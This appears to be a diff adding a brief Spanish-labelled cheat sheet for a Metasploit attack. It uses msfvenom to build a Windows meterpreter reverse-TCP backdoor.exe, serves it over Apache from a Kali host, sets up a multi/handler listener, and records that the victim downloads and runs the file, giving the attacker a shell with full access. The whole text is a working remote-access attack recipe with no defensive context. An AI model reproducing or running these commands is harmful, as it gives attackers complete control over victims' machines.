@@ -1,0 +1,22 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="ipKALI" LPORT=12345 -f exe -o backdoor.exe
+mv backdoor.exe /var/www/html
+cd /var/www/html
+chmod +x backdoor.exe
+systemctl start apache2
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST "ipKALI"
+set LPORT 12345
+exploit
+
+-windows
+descargar: "ipKALI"/backdoor.exe
+"Ejecutar"
+
+-kali
+shell
+"Acceso Completo"
+
